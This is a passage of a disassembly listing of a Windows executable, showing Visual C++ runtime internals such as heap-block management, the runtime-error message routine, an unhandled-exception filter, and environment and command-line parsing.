                mov     [edx-4], eax
                mov     [edx+esi-8], eax
                jmp     loc_41711D
; ---------------------------------------------------------------------------

loc_416FE1:                             ; CODE XREF: sub_416E44+52↑j
                                        ; sub_416E44+5C↑j
                xor     eax, eax
                jmp     loc_417120
; ---------------------------------------------------------------------------

loc_416FE8:                             ; CODE XREF: sub_416E44+49↑j
                jge     loc_41711D
                mov     ebx, [ebp+arg_4]
                sub     [ebp+arg_8], esi
                lea     ecx, [esi+1]
                mov     [ebx-4], ecx
                lea     ebx, [ebx+esi-4]
                mov     esi, [ebp+arg_8]
                sar     esi, 4
                dec     esi
                mov     [ebp+arg_4], ebx
                mov     [ebx-4], ecx
                cmp     esi, 3Fh
                jbe     short loc_417013
                push    3Fh
                pop     esi

loc_417013:                             ; CODE XREF: sub_416E44+1CA↑j
                test    byte ptr [ebp+var_4], 1
                jnz     loc_41709D
                mov     esi, [ebp+var_4]
                sar     esi, 4
                dec     esi
                cmp     esi, 3Fh
                jbe     short loc_41702C
                push    3Fh
                pop     esi

loc_41702C:                             ; CODE XREF: sub_416E44+1E3↑j
                mov     ecx, [edi+4]
                cmp     ecx, [edi+8]
                jnz     short loc_417076
                mov     ebx, 80000000h
                cmp     esi, 20h
                jnb     short loc_417057
                mov     ecx, esi
                shr     ebx, cl
                lea     esi, [esi+eax+4]
                not     ebx
                and     [eax+edx*4+44h], ebx
                dec     byte ptr [esi]
                jnz     short loc_417073
                mov     ecx, [ebp+arg_0]
                and     [ecx], ebx
                jmp     short loc_417073
; ---------------------------------------------------------------------------

loc_417057:                             ; CODE XREF: sub_416E44+1F8↑j
                lea     ecx, [esi-20h]
                shr     ebx, cl
                lea     ecx, [esi+eax+4]
                not     ebx
                and     [eax+edx*4+0C4h], ebx
                dec     byte ptr [ecx]
                jnz     short loc_417073
                mov     ecx, [ebp+arg_0]
                and     [ecx+4], ebx

loc_417073:                             ; CODE XREF: sub_416E44+20A↑j
                                        ; sub_416E44+211↑j ...
                mov     ebx, [ebp+arg_4]

loc_417076:                             ; CODE XREF: sub_416E44+1EE↑j
                mov     ecx, [edi+8]
                mov     esi, [edi+4]
                mov     [ecx+4], esi
                mov     esi, [edi+8]
                mov     ecx, [edi+4]
                mov     [ecx+8], esi
                mov     esi, [ebp+arg_8]
                add     esi, [ebp+var_4]
                mov     [ebp+arg_8], esi
                sar     esi, 4
                dec     esi
                cmp     esi, 3Fh
                jbe     short loc_41709D
                push    3Fh
                pop     esi

loc_41709D:                             ; CODE XREF: sub_416E44+1D3↑j
                                        ; sub_416E44+254↑j
                mov     ecx, [ebp+var_C]
                lea     ecx, [ecx+esi*8]
                mov     edi, [ecx+4]
                mov     [ebx+8], ecx
                mov     [ebx+4], edi
                mov     [ecx+4], ebx
                mov     ecx, [ebx+4]
                mov     [ecx+8], ebx
                mov     ecx, [ebx+4]
                cmp     ecx, [ebx+8]
                jnz     short loc_417114
                mov     cl, [esi+eax+4]
                mov     byte ptr [ebp+arg_4+3], cl
                inc     cl
                mov     [esi+eax+4], cl
                cmp     esi, 20h
                jnb     short loc_4170EB
                cmp     byte ptr [ebp+arg_4+3], 0
                jnz     short loc_4170E3
                mov     ecx, esi
                mov     edi, 80000000h
                shr     edi, cl
                mov     ecx, [ebp+arg_0]
                or      [ecx], edi

loc_4170E3:                             ; CODE XREF: sub_416E44+28F↑j
                lea     eax, [eax+edx*4+44h]
                mov     ecx, esi
                jmp     short loc_41710B
; ---------------------------------------------------------------------------

loc_4170EB:                             ; CODE XREF: sub_416E44+289↑j
                cmp     byte ptr [ebp+arg_4+3], 0
                jnz     short loc_417101
                lea     ecx, [esi-20h]
                mov     edi, 80000000h
                shr     edi, cl
                mov     ecx, [ebp+arg_0]
                or      [ecx+4], edi

loc_417101:                             ; CODE XREF: sub_416E44+2AB↑j
                lea     eax, [eax+edx*4+0C4h]
                lea     ecx, [esi-20h]

loc_41710B:                             ; CODE XREF: sub_416E44+2A5↑j
                mov     edx, 80000000h
                shr     edx, cl
                or      [eax], edx

loc_417114:                             ; CODE XREF: sub_416E44+277↑j
                mov     eax, [ebp+arg_8]
                mov     [ebx], eax
                mov     [eax+ebx-4], eax

loc_41711D:                             ; CODE XREF: sub_416E44+198↑j
                                        ; sub_416E44:loc_416FE8↑j
                xor     eax, eax
                inc     eax

loc_417120:                             ; CODE XREF: sub_416E44+19F↑j
                pop     edi
                pop     esi
                pop     ebx
                leave
                retn
sub_416E44      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_417125      proc near               ; CODE XREF: sub_40FDE3+28↑p
                                        ; sub_40FEFC+89↑p ...

var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 14h
                mov     eax, dword_42C9D0
                mov     ecx, [ebp+arg_0]
                imul    eax, 14h
                add     eax, lpMem
                add     ecx, 17h
                and     ecx, 0FFFFFFF0h
                mov     [ebp+var_10], ecx
                sar     ecx, 4
                push    ebx
                dec     ecx
                cmp     ecx, 20h
                push    esi
                push    edi
                jge     short loc_41715E
                or      esi, 0FFFFFFFFh
                shr     esi, cl
                or      [ebp+var_8], 0FFFFFFFFh
                jmp     short loc_41716B
; ---------------------------------------------------------------------------

loc_41715E:                             ; CODE XREF: sub_417125+2C↑j
                add     ecx, 0FFFFFFE0h
                or      edx, 0FFFFFFFFh
                xor     esi, esi
                shr     edx, cl
                mov     [ebp+var_8], edx

loc_41716B:                             ; CODE XREF: sub_417125+37↑j
                mov     ecx, dword_42C9DC
                mov     ebx, ecx
                jmp     short loc_417186
; ---------------------------------------------------------------------------

loc_417175:                             ; CODE XREF: sub_417125+66↓j
                mov     edx, [ebx+4]
                mov     edi, [ebx]
                and     edx, [ebp+var_8]
                and     edi, esi
                or      edx, edi
                jnz     short loc_41718D
                add     ebx, 14h

loc_417186:                             ; CODE XREF: sub_417125+4E↑j
                mov     [ebp+arg_0], ebx
                cmp     ebx, eax
                jb      short loc_417175

loc_41718D:                             ; CODE XREF: sub_417125+5C↑j
                cmp     ebx, eax
                jnz     short loc_417210
                mov     ebx, lpMem
                jmp     short loc_4171AA
; ---------------------------------------------------------------------------

loc_417199:                             ; CODE XREF: sub_417125+8A↓j
                mov     edx, [ebx+4]
                mov     edi, [ebx]
                and     edx, [ebp+var_8]
                and     edi, esi
                or      edx, edi
                jnz     short loc_4171B1
                add     ebx, 14h

loc_4171AA:                             ; CODE XREF: sub_417125+72↑j
                mov     [ebp+arg_0], ebx
                cmp     ebx, ecx
                jb      short loc_417199

loc_4171B1:                             ; CODE XREF: sub_417125+80↑j
                cmp     ebx, ecx
                jnz     short loc_417210
                jmp     short loc_4171C3
; ---------------------------------------------------------------------------

loc_4171B7:                             ; CODE XREF: sub_417125+A0↓j
                cmp     dword ptr [ebx+8], 0
                jnz     short loc_4171C7
                add     ebx, 14h
                mov     [ebp+arg_0], ebx

loc_4171C3:                             ; CODE XREF: sub_417125+90↑j
                cmp     ebx, eax
                jb      short loc_4171B7

loc_4171C7:                             ; CODE XREF: sub_417125+96↑j
                cmp     ebx, eax
                jnz     short loc_4171FC
                mov     ebx, lpMem
                jmp     short loc_4171DC
; ---------------------------------------------------------------------------

loc_4171D3:                             ; CODE XREF: sub_417125+BC↓j
                cmp     dword ptr [ebx+8], 0
                jnz     short loc_4171E3
                add     ebx, 14h

loc_4171DC:                             ; CODE XREF: sub_417125+AC↑j
                mov     [ebp+arg_0], ebx
                cmp     ebx, ecx
                jb      short loc_4171D3

loc_4171E3:                             ; CODE XREF: sub_417125+B2↑j
                cmp     ebx, ecx
                jnz     short loc_4171FC
                call    sub_416C8C
                mov     ebx, eax
                mov     [ebp+arg_0], ebx
                test    ebx, ebx
                jnz     short loc_4171FC

loc_4171F5:                             ; CODE XREF: sub_417125+E9↓j
                xor     eax, eax
                jmp     loc_417405
; ---------------------------------------------------------------------------

loc_4171FC:                             ; CODE XREF: sub_417125+A4↑j
                                        ; sub_417125+C0↑j ...
                push    ebx
                call    sub_416D3C
                pop     ecx
                mov     ecx, [ebx+10h]
                mov     [ecx], eax
                mov     eax, [ebx+10h]
                cmp     dword ptr [eax], 0FFFFFFFFh
                jz      short loc_4171F5

loc_417210:                             ; CODE XREF: sub_417125+6A↑j
                                        ; sub_417125+8E↑j
                mov     dword_42C9DC, ebx
                mov     eax, [ebx+10h]
                mov     edx, [eax]
                mov     [ebp+var_4], edx
                cmp     edx, 0FFFFFFFFh
                jz      short loc_417237
                mov     ecx, [eax+edx*4+0C4h]
                mov     edi, [eax+edx*4+44h]
                and     ecx, [ebp+var_8]
                and     edi, esi
                or      ecx, edi
                jnz     short loc_417260

loc_417237:                             ; CODE XREF: sub_417125+FC↑j
                and     [ebp+var_4], 0
                mov     edx, [eax+0C4h]
                lea     ecx, [eax+44h]

loc_417244:                             ; CODE XREF: sub_417125+136↓j
                mov     edi, [ecx]
                and     edx, [ebp+var_8]
                and     edi, esi
                or      edx, edi
                jnz     short loc_41725D
                inc     [ebp+var_4]
                mov     edx, [ecx+84h]
                add     ecx, 4
                jmp     short loc_417244
; ---------------------------------------------------------------------------

loc_41725D:                             ; CODE XREF: sub_417125+128↑j
                mov     edx, [ebp+var_4]

loc_417260:                             ; CODE XREF: sub_417125+110↑j
                mov     ecx, edx
                imul    ecx, 204h
                lea     ecx, [ecx+eax+144h]
                mov     [ebp+var_C], ecx
                mov     ecx, [eax+edx*4+44h]
                xor     edi, edi
                and     ecx, esi
                jnz     short loc_41728E
                mov     ecx, [eax+edx*4+0C4h]
                and     ecx, [ebp+var_8]
                push    20h
                pop     edi
                jmp     short loc_41728E
; ---------------------------------------------------------------------------

loc_41728B:                             ; CODE XREF: sub_417125+16B↓j
                add     ecx, ecx
                inc     edi

loc_41728E:                             ; CODE XREF: sub_417125+155↑j
                                        ; sub_417125+164↑j
                test    ecx, ecx
                jge     short loc_41728B
                mov     ecx, [ebp+var_C]
                mov     edx, [ecx+edi*8+4]
                mov     ecx, [edx]
                sub     ecx, [ebp+var_10]
                mov     esi, ecx
                sar     esi, 4
                dec     esi
                cmp     esi, 3Fh
                mov     [ebp+var_8], ecx
                jle     short loc_4172AF
                push    3Fh
                pop     esi

loc_4172AF:                             ; CODE XREF: sub_417125+185↑j
                cmp     esi, edi
                jz      loc_4173B8
                mov     ecx, [edx+4]
                cmp     ecx, [edx+8]
                jnz     short loc_41731B
                cmp     edi, 20h
                mov     ebx, 80000000h
                jge     short loc_4172EF
                mov     ecx, edi
                shr     ebx, cl
                mov     ecx, [ebp+var_4]
                lea     edi, [eax+edi+4]
                not     ebx
                mov     [ebp+var_14], ebx
                and     ebx, [eax+ecx*4+44h]
                mov     [eax+ecx*4+44h], ebx
                dec     byte ptr [edi]
                jnz     short loc_417318
                mov     ecx, [ebp+var_14]
                mov     ebx, [ebp+arg_0]
                and     [ebx], ecx
                jmp     short loc_41731B
; ---------------------------------------------------------------------------

loc_4172EF:                             ; CODE XREF: sub_417125+1A2↑j
                lea     ecx, [edi-20h]
                shr     ebx, cl
                mov     ecx, [ebp+var_4]
                lea     ecx, [eax+ecx*4+0C4h]
                lea     edi, [eax+edi+4]
                not     ebx
                and     [ecx], ebx
                dec     byte ptr [edi]
                mov     [ebp+var_14], ebx
                jnz     short loc_417318
                mov     ebx, [ebp+arg_0]
                mov     ecx, [ebp+var_14]
                and     [ebx+4], ecx
                jmp     short loc_41731B
; ---------------------------------------------------------------------------

loc_417318:                             ; CODE XREF: sub_417125+1BE↑j
                                        ; sub_417125+1E6↑j
                mov     ebx, [ebp+arg_0]

loc_41731B:                             ; CODE XREF: sub_417125+198↑j
                                        ; sub_417125+1C8↑j ...
                cmp     [ebp+var_8], 0
                mov     ecx, [edx+8]
                mov     edi, [edx+4]
                mov     [ecx+4], edi
                mov     ecx, [edx+4]
                mov     edi, [edx+8]
                mov     [ecx+8], edi
                jz      loc_4173C4
                mov     ecx, [ebp+var_C]
                lea     ecx, [ecx+esi*8]
                mov     edi, [ecx+4]
                mov     [edx+8], ecx
                mov     [edx+4], edi
                mov     [ecx+4], edx
                mov     ecx, [edx+4]
                mov     [ecx+8], edx
                mov     ecx, [edx+4]
                cmp     ecx, [edx+8]
                jnz     short loc_4173B5
                mov     cl, [esi+eax+4]
                mov     byte ptr [ebp+arg_0+3], cl
                inc     cl
                cmp     esi, 20h
                mov     [esi+eax+4], cl
                jge     short loc_41738C
                cmp     byte ptr [ebp+arg_0+3], 0
                jnz     short loc_41737A
                mov     edi, 80000000h
                mov     ecx, esi
                shr     edi, cl
                or      [ebx], edi

loc_41737A:                             ; CODE XREF: sub_417125+248↑j
                mov     ecx, esi
                mov     edi, 80000000h
                shr     edi, cl
                mov     ecx, [ebp+var_4]
                or      [eax+ecx*4+44h], edi
                jmp     short loc_4173B5
; ---------------------------------------------------------------------------

loc_41738C:                             ; CODE XREF: sub_417125+242↑j
                cmp     byte ptr [ebp+arg_0+3], 0
                jnz     short loc_41739F
                lea     ecx, [esi-20h]
                mov     edi, 80000000h
                shr     edi, cl
                or      [ebx+4], edi

loc_41739F:                             ; CODE XREF: sub_417125+26B↑j
                mov     ecx, [ebp+var_4]
                lea     edi, [eax+ecx*4+0C4h]
                lea     ecx, [esi-20h]
                mov     esi, 80000000h
                shr     esi, cl
                or      [edi], esi

loc_4173B5:                             ; CODE XREF: sub_417125+230↑j
                                        ; sub_417125+265↑j
                mov     ecx, [ebp+var_8]

loc_4173B8:                             ; CODE XREF: sub_417125+18C↑j
                test    ecx, ecx
                jz      short loc_4173C7
                mov     [edx], ecx
                mov     [ecx+edx-4], ecx
                jmp     short loc_4173C7
; ---------------------------------------------------------------------------

loc_4173C4:                             ; CODE XREF: sub_417125+20C↑j
                mov     ecx, [ebp+var_8]

loc_4173C7:                             ; CODE XREF: sub_417125+295↑j
                                        ; sub_417125+29D↑j
                mov     esi, [ebp+var_10]
                add     edx, ecx
                lea     ecx, [esi+1]
                mov     [edx], ecx
                mov     [edx+esi-4], ecx
                mov     esi, [ebp+var_C]
                mov     ecx, [esi]
                lea     edi, [ecx+1]
                mov     [esi], edi
                test    ecx, ecx
                jnz     short loc_4173FD
                cmp     ebx, dword_42B000
                jnz     short loc_4173FD
                mov     ecx, [ebp+var_4]
                cmp     ecx, dword_42C9E4
                jnz     short loc_4173FD
                and     dword_42B000, 0

loc_4173FD:                             ; CODE XREF: sub_417125+2BC↑j
                                        ; sub_417125+2C4↑j ...
                mov     ecx, [ebp+var_4]
                mov     [eax], ecx
                lea     eax, [edx+4]

loc_417405:                             ; CODE XREF: sub_417125+D2↑j
                pop     edi
                pop     esi
                pop     ebx
                leave
                retn
sub_417125      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41740A      proc near               ; CODE XREF: sub_40FE32+2A↑p
                                        ; sub_410117+16↑p ...

NumberOfBytesWritten= dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                push    ecx
                push    ebx
                mov     ebx, [ebp+arg_0]
                push    esi
                push    edi
                xor     esi, esi
                xor     edi, edi
                mov     [ebp+var_4], edi

loc_41741E:                             ; CODE XREF: sub_41740A+24↓j
                cmp     ebx, dword_425CF8[edi*8]
                jz      short loc_417430
                inc     edi
                mov     [ebp+var_4], edi
                cmp     edi, 17h
                jb      short loc_41741E

loc_417430:                             ; CODE XREF: sub_41740A+1B↑j
                cmp     edi, 17h
                jnb     loc_4175B0
                push    3
                call    sub_41C7C8
                pop     ecx
                cmp     eax, 1
                jz      loc_41757E
                push    3
                call    sub_41C7C8
                pop     ecx
                test    eax, eax
                jnz     short loc_417463
                cmp     dword_425030, 1
                jz      loc_41757E

loc_417463:                             ; CODE XREF: sub_41740A+4A↑j
                cmp     ebx, 0FCh
                jz      loc_4175B0
                push    offset aRuntimeErrorPr ; "Runtime Error!\n\nProgram: "
                mov     ebx, 314h
                push    ebx
                mov     edi, offset unk_42B008
                push    edi
                call    sub_4128F1
                add     esp, 0Ch
                test    eax, eax
                jz      short loc_417499
                push    esi
                push    esi
                push    esi
                push    esi
                push    esi
                call    sub_40EB2C
                add     esp, 14h

loc_417499:                             ; CODE XREF: sub_41740A+80↑j
                push    104h            ; nSize
                mov     esi, offset Filename
                push    esi             ; lpFilename
                push    0               ; hModule
                mov     byte_42B125, 0
                call    ds:GetModuleFileNameA
                test    eax, eax
                jnz     short loc_4174DD
                push    offset aProgramNameUnk ; "<program name unknown>"
                push    2FBh
                push    esi
                call    sub_4128F1
                add     esp, 0Ch
                test    eax, eax
                jz      short loc_4174DD
                xor     eax, eax
                push    eax
                push    eax
                push    eax
                push    eax
                push    eax
                call    sub_40EB2C
                add     esp, 14h

loc_4174DD:                             ; CODE XREF: sub_41740A+AB↑j
                                        ; sub_41740A+C2↑j
                push    esi
                call    sub_4102A0
                inc     eax
                pop     ecx
                cmp     eax, 3Ch
                jbe     short loc_417522
                push    esi
                call    sub_4102A0
                sub     esi, 3Bh
                add     eax, esi
                push    3
                mov     ecx, offset dword_42B31C
                push    offset asc_420ABC ; "..."
                sub     ecx, eax
                push    ecx
                push    eax
                call    sub_419756
                add     esp, 14h
                test    eax, eax
                jz      short loc_417522
                xor     esi, esi
                push    esi
                push    esi
                push    esi
                push    esi
                push    esi
                call    sub_40EB2C
                add     esp, 14h
                jmp     short loc_417524
; ---------------------------------------------------------------------------

loc_417522:                             ; CODE XREF: sub_41740A+DE↑j
                                        ; sub_41740A+105↑j
                xor     esi, esi

loc_417524:                             ; CODE XREF: sub_41740A+116↑j
                push    offset asc_420AB8 ; "\n\n"
                push    ebx
                push    edi
                call    sub_419693
                add     esp, 0Ch
                test    eax, eax
                jz      short loc_417544
                push    esi
                push    esi
                push    esi
                push    esi
                push    esi
                call    sub_40EB2C
                add     esp, 14h

loc_417544:                             ; CODE XREF: sub_41740A+12B↑j
                mov     eax, [ebp+var_4]
                push    off_425CFC[eax*8]
                push    ebx
                push    edi
                call    sub_419693
                add     esp, 0Ch
                test    eax, eax
                jz      short loc_417569
                push    esi
                push    esi
                push    esi
                push    esi
                push    esi
                call    sub_40EB2C
                add     esp, 14h

loc_417569:                             ; CODE XREF: sub_41740A+150↑j
                push    12010h
                push    offset aMicrosoftVisua ; "Microsoft Visual C++ Runtime Library"
                push    edi
                call    sub_41C65F
                add     esp, 0Ch
                jmp     short loc_4175B0
; ---------------------------------------------------------------------------

loc_41757E:                             ; CODE XREF: sub_41740A+3A↑j
                                        ; sub_41740A+53↑j
                push    0FFFFFFF4h      ; nStdHandle
                call    ds:GetStdHandle
                mov     ebx, eax
                cmp     ebx, esi
                jz      short loc_4175B0
                cmp     ebx, 0FFFFFFFFh
                jz      short loc_4175B0
                push    0               ; lpOverlapped
                lea     eax, [ebp+NumberOfBytesWritten]
                push    eax             ; lpNumberOfBytesWritten
                lea     esi, off_425CFC[edi*8]
                push    dword ptr [esi]
                call    sub_4102A0
                pop     ecx
                push    eax             ; nNumberOfBytesToWrite
                push    dword ptr [esi] ; lpBuffer
                push    ebx             ; hFile
                call    ds:WriteFile

loc_4175B0:                             ; CODE XREF: sub_41740A+29↑j
                                        ; sub_41740A+5F↑j ...
                pop     edi
                pop     esi
                pop     ebx
                leave
                retn
sub_41740A      endp


; =============== S U B R O U T I N E =======================================


sub_4175B5      proc near               ; CODE XREF: sub_40FE32+23↑p
                                        ; sub_410117+E↑p ...
                push    3
                call    sub_41C7C8
                pop     ecx
                cmp     eax, 1
                jz      short loc_4175D7
                push    3
                call    sub_41C7C8
                pop     ecx
                test    eax, eax
                jnz     short locret_4175ED
                cmp     dword_425030, 1
                jnz     short locret_4175ED

loc_4175D7:                             ; CODE XREF: sub_4175B5+B↑j
                push    0FCh
                call    sub_41740A
                push    0FFh
                call    sub_41740A
                pop     ecx
                pop     ecx

locret_4175ED:                          ; CODE XREF: sub_4175B5+17↑j
                                        ; sub_4175B5+20↑j
                retn
sub_4175B5      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; LONG __stdcall TopLevelExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo)
TopLevelExceptionFilter proc near       ; DATA XREF: sub_417630↓o

ExceptionInfo   = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+ExceptionInfo]
                mov     eax, [eax]
                cmp     dword ptr [eax], 0E06D7363h
                jnz     short loc_41762A
                cmp     dword ptr [eax+10h], 3
                jnz     short loc_41762A
                mov     eax, [eax+14h]
                cmp     eax, 19930520h
                jz      short loc_417625
                cmp     eax, 19930521h
                jz      short loc_417625
                cmp     eax, 19930522h
                jz      short loc_417625
                cmp     eax, 1994000h
                jnz     short loc_41762A

loc_417625:                             ; CODE XREF: TopLevelExceptionFilter+20↑j
                                        ; TopLevelExceptionFilter+27↑j ...
                call    sub_418843
; ---------------------------------------------------------------------------

loc_41762A:                             ; CODE XREF: TopLevelExceptionFilter+10↑j
                                        ; TopLevelExceptionFilter+16↑j ...
                xor     eax, eax
                pop     ebp
                retn    4
TopLevelExceptionFilter endp


; =============== S U B R O U T I N E =======================================


sub_417630      proc near               ; DATA XREF: .rdata:00420214↓o
                push    offset TopLevelExceptionFilter ; lpTopLevelExceptionFilter
                call    ds:SetUnhandledExceptionFilter
                xor     eax, eax
                retn
sub_417630      endp


; =============== S U B R O U T I N E =======================================


sub_41763E      proc near               ; CODE XREF: start:loc_4101FB↑p
                cmp     dword_42DB34, 0
                jnz     short loc_41764C
                call    sub_411DBE

loc_41764C:                             ; CODE XREF: sub_41763E+7↑j
                push    esi
                mov     esi, dword_42AAD4
                push    edi
                xor     edi, edi
                test    esi, esi
                jnz     short loc_417672

loc_41765A:                             ; CODE XREF: sub_41763E+4F↓j
                or      eax, 0FFFFFFFFh
                jmp     loc_417702
; ---------------------------------------------------------------------------

loc_417662:                             ; CODE XREF: sub_41763E+38↓j
                cmp     al, 3Dh
                jz      short loc_417667
                inc     edi

loc_417667:                             ; CODE XREF: sub_41763E+26↑j
                push    esi
                call    sub_4102A0
                pop     ecx
                lea     esi, [esi+eax+1]

loc_417672:                             ; CODE XREF: sub_41763E+1A↑j
                mov     al, [esi]
                test    al, al
                jnz     short loc_417662
                push    4
                inc     edi
                push    edi
                call    sub_412BF8
                mov     edi, eax
                pop     ecx
                pop     ecx
                mov     dword_42AE68, edi
                test    edi, edi
                jz      short loc_41765A
                mov     esi, dword_42AAD4
                push    ebx
                jmp     short loc_4176DA
; ---------------------------------------------------------------------------

loc_417698:                             ; CODE XREF: sub_41763E+9F↓j
                push    esi
                call    sub_4102A0
                mov     ebx, eax
                inc     ebx
                cmp     byte ptr [esi], 3Dh
                pop     ecx
                jz      short loc_4176D8
                push    1
                push    ebx
                call    sub_412BF8
                pop     ecx
                pop     ecx
                mov     [edi], eax
                test    eax, eax
                jz      short loc_417705
                push    esi
                push    ebx
                push    eax
                call    sub_4128F1
                add     esp, 0Ch
                test    eax, eax
                jz      short loc_4176D5
                xor     eax, eax
                push    eax
                push    eax
                push    eax
                push    eax
                push    eax
                call    sub_40EB2C
                add     esp, 14h

loc_4176D5:                             ; CODE XREF: sub_41763E+86↑j
                add     edi, 4

loc_4176D8:                             ; CODE XREF: sub_41763E+67↑j
                add     esi, ebx

loc_4176DA:                             ; CODE XREF: sub_41763E+58↑j
                cmp     byte ptr [esi], 0
                jnz     short loc_417698
                push    dword_42AAD4    ; lpMem
                call    sub_40FD55
                and     dword_42AAD4, 0
                and     dword ptr [edi], 0
                mov     dword_42DB28, 1
                xor     eax, eax

loc_417700:                             ; CODE XREF: sub_41763E+DC↓j
                pop     ecx
                pop     ebx

loc_417702:                             ; CODE XREF: sub_41763E+1F↑j
                pop     edi
                pop     esi
                retn
; ---------------------------------------------------------------------------

loc_417705:                             ; CODE XREF: sub_41763E+77↑j
                push    dword_42AE68    ; lpMem
                call    sub_40FD55
                and     dword_42AE68, 0
                or      eax, 0FFFFFFFFh
                jmp     short loc_417700
sub_41763E      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41771C      proc near               ; CODE XREF: sub_4178B6+57↓p
                                        ; sub_4178B6+98↓p

var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                mov     ecx, [ebp+arg_8]
                push    ebx
                xor     eax, eax
                push    esi
                mov     [edi], eax
                mov     esi, edx
                mov     edx, [ebp+arg_4]
                mov     dword ptr [ecx], 1
                cmp     [ebp+arg_0], eax
                jz      short loc_417744
                mov     ebx, [ebp+arg_0]
                add     [ebp+arg_0], 4
                mov     [ebx], edx

loc_417744:                             ; CODE XREF: sub_41771C+1D↑j
                mov     [ebp+var_4], eax

loc_417747:                             ; CODE XREF: sub_41771C+80↓j
                                        ; sub_41771C+8A↓j
                cmp     byte ptr [esi], 22h
                jnz     short loc_41775C
                xor     eax, eax
                cmp     [ebp+var_4], eax
                mov     bl, 22h
                setz    al
                inc     esi
                mov     [ebp+var_4], eax
                jmp     short loc_417798
; ---------------------------------------------------------------------------

loc_41775C:                             ; CODE XREF: sub_41771C+2E↑j
                inc     dword ptr [edi]
                test    edx, edx
                jz      short loc_41776A
                mov     al, [esi]
                mov     [edx], al
                inc     edx
                mov     [ebp+arg_4], edx

loc_41776A:                             ; CODE XREF: sub_41771C+44↑j
                mov     bl, [esi]
                movzx   eax, bl
                push    eax
                inc     esi
                call    sub_41C866
                pop     ecx
                test    eax, eax
                jz      short loc_41778E
                inc     dword ptr [edi]
                cmp     [ebp+arg_4], 0
                jz      short loc_41778D
                mov     ecx, [ebp+arg_4]
                mov     al, [esi]
                inc     [ebp+arg_4]
                mov     [ecx], al

loc_41778D:                             ; CODE XREF: sub_41771C+65↑j
                inc     esi

loc_41778E:                             ; CODE XREF: sub_41771C+5D↑j
                mov     edx, [ebp+arg_4]
                mov     ecx, [ebp+arg_8]
                test    bl, bl
                jz      short loc_4177CA

loc_417798:                             ; CODE XREF: sub_41771C+3E↑j
                cmp     [ebp+var_4], 0
                jnz     short loc_417747
                cmp     bl, 20h
                jz      short loc_4177A8
                cmp     bl, 9
                jnz     short loc_417747

loc_4177A8:                             ; CODE XREF: sub_41771C+85↑j
                test    edx, edx
                jz      short loc_4177B0
                mov     byte ptr [edx-1], 0

loc_4177B0:                             ; CODE XREF: sub_41771C+8E↑j
                                        ; sub_41771C+AF↓j
                and     [ebp+var_4], 0

loc_4177B4:                             ; CODE XREF: sub_41771C+185↓j
                cmp     byte ptr [esi], 0
                jz      loc_4178A6

loc_4177BD:                             ; CODE XREF: sub_41771C+AC↓j
                mov     al, [esi]
                cmp     al, 20h
                jz      short loc_4177C7
                cmp     al, 9
                jnz     short loc_4177CD

loc_4177C7:                             ; CODE XREF: sub_41771C+A5↑j
                inc     esi
                jmp     short loc_4177BD
; ---------------------------------------------------------------------------

loc_4177CA:                             ; CODE XREF: sub_41771C+7A↑j
                dec     esi
                jmp     short loc_4177B0
; ---------------------------------------------------------------------------

loc_4177CD:                             ; CODE XREF: sub_41771C+A9↑j
                cmp     byte ptr [esi], 0
                jz      loc_4178A6
                cmp     [ebp+arg_0], 0
                jz      short loc_4177E5
                mov     eax, [ebp+arg_0]
                add     [ebp+arg_0], 4
                mov     [eax], edx

loc_4177E5:                             ; CODE XREF: sub_41771C+BE↑j
                inc     dword ptr [ecx]

loc_4177E7:                             ; CODE XREF: sub_41771C+170↓j
                xor     ebx, ebx
                inc     ebx
                xor     ecx, ecx
                jmp     short loc_4177F0
; ---------------------------------------------------------------------------

loc_4177EE:                             ; CODE XREF: sub_41771C+D7↓j
                inc     esi
                inc     ecx

loc_4177F0:                             ; CODE XREF: sub_41771C+D0↑j
                cmp     byte ptr [esi], 5Ch
                jz      short loc_4177EE
                cmp     byte ptr [esi], 22h
                jnz     short loc_417820
                test    cl, 1
                jnz     short loc_41781E
                cmp     [ebp+var_4], 0
                jz      short loc_417811
                lea     eax, [esi+1]
                cmp     byte ptr [eax], 22h
                jnz     short loc_417811
                mov     esi, eax
                jmp     short loc_41781E
; ---------------------------------------------------------------------------

loc_417811:                             ; CODE XREF: sub_41771C+E7↑j
                                        ; sub_41771C+EF↑j
                xor     eax, eax
                xor     ebx, ebx
                cmp     [ebp+var_4], eax
                setz    al
                mov     [ebp+var_4], eax

loc_41781E:                             ; CODE XREF: sub_41771C+E1↑j
                                        ; sub_41771C+F3↑j
                shr     ecx, 1

loc_417820:                             ; CODE XREF: sub_41771C+DC↑j
                test    ecx, ecx
                jz      short loc_417836

loc_417824:                             ; CODE XREF: sub_41771C+115↓j
                dec     ecx
                test    edx, edx
                jz      short loc_41782D
                mov     byte ptr [edx], 5Ch
                inc     edx

loc_41782D:                             ; CODE XREF: sub_41771C+10B↑j
                inc     dword ptr [edi]
                test    ecx, ecx
                jnz     short loc_417824
                mov     [ebp+arg_4], edx

loc_417836:                             ; CODE XREF: sub_41771C+106↑j
                mov     al, [esi]
                test    al, al
                jz      short loc_417891
                cmp     [ebp+var_4], 0
                jnz     short loc_41784A
                cmp     al, 20h
                jz      short loc_417891
                cmp     al, 9
                jz      short loc_417891

loc_41784A:                             ; CODE XREF: sub_41771C+124↑j
                test    ebx, ebx
                jz      short loc_41788B
                movsx   eax, al
                push    eax
                test    edx, edx
                jz      short loc_417879
                call    sub_41C866
                pop     ecx
                test    eax, eax
                jz      short loc_41786D
                mov     al, [esi]
                mov     ecx, [ebp+arg_4]
                inc     [ebp+arg_4]
                mov     [ecx], al
                inc     esi
                inc     dword ptr [edi]

loc_41786D:                             ; CODE XREF: sub_41771C+142↑j
